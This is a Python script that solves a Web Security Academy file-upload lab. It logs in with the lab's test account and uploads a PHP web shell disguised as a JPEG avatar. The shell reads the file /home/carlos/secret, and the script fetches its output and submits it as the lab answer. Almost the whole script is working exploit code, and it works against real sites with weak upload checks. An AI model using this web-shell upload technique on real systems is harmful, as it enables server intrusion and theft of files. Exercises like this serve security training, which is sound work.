# usage:
# python3 2.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net \
# --f /home/carlos/secret

import re
from argparse import ArgumentParser

import requests


class Solution:
    def __init__(self, url: str, filename: str) -> None:
        self.url = url.rstrip("/")
        self.filename = filename
        self.s = None

    def login(self, username: str, password: str) -> requests.Response:
        login_url = f"{self.url}/login"
        self.s = requests.Session()
        r = self.s.get(login_url)
        csrf = re.findall(r"\"csrf\" value=\"([\w]+)\"", r.text)[0]
        r = self.s.post(
            login_url,
            data={
                "csrf": csrf,
                "username": username,
                "password": password,
            },
        )

        return r

    def solve(self) -> None:
        self.login("wiener", "peter")

        files = {
            "avatar": (
                "shell.php",
                f"<?php echo file_get_contents('{self.filename}'); ?>",
                "image/jpeg",
            )
        }

        my_account_url = f"{self.url}/my-account"
        r = self.s.get(my_account_url)
        csrf = re.findall(r"\"csrf\" value=\"([\w]+)\"", r.text)[0]
        self.s.post(
            my_account_url + "/avatar",
            files=files,
            data={"csrf": csrf, "user": "wiener"},
        )
        r = self.s.get(f"{self.url}/files/avatars/shell.php")
        self.s.post(f"{self.url}/submitSolution", data={"answer": r.text})


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    parser.add_argument("--f", "--filename", dest="filename")
    args = parser.parse_args()
    s = Solution(args.url, args.filename)
    s.solve()


if __name__ == "__main__":
    main()
